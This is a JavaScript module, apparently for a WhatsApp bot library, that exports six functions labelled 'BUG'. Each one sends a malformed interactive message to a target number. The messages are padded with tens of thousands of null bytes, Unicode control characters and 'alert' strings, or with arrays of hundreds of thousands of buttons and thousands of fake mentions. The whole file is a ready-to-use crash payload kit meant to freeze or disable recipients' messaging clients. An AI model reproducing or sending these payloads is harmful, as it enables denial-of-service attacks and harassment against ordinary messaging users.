// ===== BUG 1: justtrymamzz =====
async function justtrymamzz(sock, target) {
  try {
    const msg = {
      interactiveMessage: {
        body: {
          text: "mamzzoficial".repeat(90000) + "\u0000".repeat(90000)
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(90000),
                id: "\u600b".repeat(90000)
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "\u0000".repeat(90000),
                id: "ꦾ".repeat(90000)
              })
            }
          ]
        },
        contextInfo: {
          mentionedJid: [target],
          quotedMessage: {
            interactiveMessage: {
              body: { text: "ꦾ".repeat(90000) },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "ꦾ".repeat(90000),
                      id: "\u0000".repeat(90000)
                    })
                  }
                ]
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    return { status: "sent", bug: "justtrymamzz", target };
  } catch (err) {
    return { status: "error", bug: "justtrymamzz", error: err.message };
  }
}

// ===== BUG 2: DelaySange =====
async function DelaySange(sock, target) {
  try {
    const msg = {
      key: {
        richResponseMessage: {},
        remoteJid: target,
        fromMe: true,
        id: "ABC123XYZ",
        extra1: "\u0000".repeat(555)
      },
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "kangen kamu dah😹😹",
              display_text: "x9234"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({})),
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  ),
                  ...Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  )
                ]
              },
              messageAIRichResponseCodeMetadata: {
                codeLanguage: "rusia",
                codeBlocks: [{ highlightType: 0, codeContent: "uhz" }],
                enumAIRichResponseCodeHighlightType: {
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_DEFAULT: 0,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_KEYWORD: 1,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_METHOD: 2,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_STRING: 3,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_NUMBER: 4,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_COMMENT: 5
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});
    console.log("✅ SUCCESS SEND BUGS");
    return { status: "sent", bug: "DelaySange", target };
  } catch (err) {
    return { status: "error", bug: "DelaySange", error: err.message };
  }
}

// ===== BUG 3: alertFlood =====
async function alertFlood(sock, target) {
  try {
    const msg = {
      interactiveMessage: {
        body: { text: "alert('" + "X".repeat(120000) + "')" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "alert('" + "X".repeat(80000) + "')",
                id: "alert('" + "\u0000".repeat(80000) + "')"
              })
            }
          ]
        },
        contextInfo: {
          mentionedJid: [target],
          quotedMessage: {
            interactiveMessage: {
              body: { text: "alert('" + "X".repeat(80000) + "')" },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: "alert('" + "X".repeat(80000) + "')",
                      id: "alert('" + "\u0000".repeat(80000) + "')"
                    })
                  }
                ]
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    return { status: "sent", bug: "alertFlood", target };
  } catch (err) {
    return { status: "error", bug: "alertFlood", error: err.message };
  }
}

// ===== BUG 4: alertNested =====
async function alertNested(sock, target) {
  try {
    const payload = "alert('" + "A".repeat(50000) + "');".repeat(4);
    const msg = {
      interactiveMessage: {
        body: { text: payload },
        nativeFlowMessage: {
          buttons: Array.from({ length: 2000 }, (_, i) => ({
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "alert(" + i + ")",
              id: "alert('" + "B".repeat(40000) + "')"
            })
          })),
          contextInfo: {
            mentionedJid: Array.from({ length: 3000 }, () =>
              "2" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
            )
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});
    return { status: "sent", bug: "alertNested", target };
  } catch (err) {
    return { status: "error", bug: "alertNested", error: err.message };
  }
}

// ===== BUG 5: alertGroup =====
async function alertGroup(sock, target) {
  try {
    const msg = {
      key: {
        richResponseMessage: {},
        remoteJid: target,
        fromMe: true,
        id: "ALERT" + Date.now(),
        extra1: "alert('" + "\u0000".repeat(500) + "')"
      },
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "alert('" + "G".repeat(100000) + "')",
              display_text: "alert(1)"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 300000 }, () => ({
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "alert('" + "C".repeat(1000) + "')",
                  id: "alert('" + "D".repeat(1000) + "')"
                })
              })),
              contextInfo: {
                mentionedJid: [
                  target,
                  ...Array.from({ length: 5000 }, () =>
                    "3" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                  )
                ]
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});
    return { status: "sent", bug: "alertGroup", target };
  } catch (err) {
    return { status: "error", bug: "alertGroup", error: err.message };
  }
}

// ===== BUG 6: alertUnicode =====
async function alertUnicode(sock, target) {
  try {
    const weird = "ꦾ\u600b\u0000\u202e";
    const msg = {
      interactiveMessage: {
        body: { text: "alert('" + weird.repeat(30000) + "')" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: weird.repeat(30000),
                id: "alert('" + weird.repeat(30000) + "')"
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "alert('" + weird.repeat(30000) + "')",
                id: weird.repeat(30000)
              })
            }
          ]
        },
        contextInfo: {
          mentionedJid: [target],
          quotedMessage: {
            interactiveMessage: {
              body: { text: "alert('" + weird.repeat(20000) + "')" },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                      display_text: weird.repeat(20000),
                      id: "alert('" + weird.repeat(20000) + "')"
                    })
                  }
                ]
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    return { status: "sent", bug: "alertUnicode", target };
  } catch (err) {
    return { status: "error", bug: "alertUnicode", error: err.message };
  }
}

module.exports = {
  justtrymamzz, DelaySange,
  alertFlood, alertNested, alertGroup, alertUnicode
};